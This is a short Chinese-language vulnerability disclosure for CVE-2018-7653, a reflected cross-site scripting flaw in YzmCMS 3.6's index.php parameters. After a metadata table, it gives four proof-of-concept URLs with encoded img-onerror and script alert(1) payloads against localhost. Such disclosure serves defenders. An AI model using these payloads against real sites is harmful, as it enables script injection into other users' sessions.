### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|YzmCMS 3.6存在XSS漏洞|2018-04-05|zzw (zzw@5ecurity.cn)|[http://www.yzmcms.com/](http://www.yzmcms.com/) | [http://www.yzmcms.com/](http://www.yzmcms.com/) |3.6| [CVE-2018-7653](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7653)|  

#### 漏洞概述  

> YzmCMS 3.6版本的 index.php页面a、c、m参数过滤不严格可导致跨站脚本漏洞。  

### POC实现代码如下：  

> poc代码:

``` html
http://localhost/YzmCMS/index.php?m=search&c=index&a=initxqb4n%3Cimg%20src%3da%20onerror%3dalert(1)%3Ecu9rs&modelid=1&q=tes 
 
http://localhost/YzmCMS/index.php?m=search&c=indexf9q6s%3cimg%20src%3da%20onerror%3dalert(1)%3ej4yck&a=init&modelid=1&q=tes 
 
http://localhost/YzmCMS/index.php?m=searchr81z4%3cimg%20src%3da%20onerror%3dalert(1)%3eo92wf&c=index&a=init&modelid=1&q=tes 
 
http://localhost/YzmCMS/index.php?m=search&c=index&a=init&modelid=1b2sgd%22%3e%3cscript%3ealert(1)%3c%2fscript%3eopzx0&q=tes
```
